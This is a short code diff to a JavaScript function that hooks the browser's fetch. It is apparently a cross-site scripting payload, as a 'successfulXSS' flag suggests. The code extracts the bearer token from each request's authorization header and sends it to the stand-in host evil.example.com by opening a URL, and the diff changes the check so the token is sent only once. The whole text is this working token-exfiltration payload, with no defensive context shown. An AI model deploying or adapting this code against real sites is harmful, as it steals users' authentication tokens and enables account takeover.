@@ -7,7 +7,7 @@ function install() {
     	console.log('intercepting fetch', args.at(0))
     	const authHeader = args?.at(1)?.headers?.get('authorization')
     	const token = authHeader?.split(' ').at(1)
-    	if (token && !success) {
+    	if (token && !window.successfulXSS) {
     	  const evilUrl = `https://evil.example.com/?token=${token}`
         window.successfulXSS = true
     	  window.open(evilUrl, '_blank').focus();
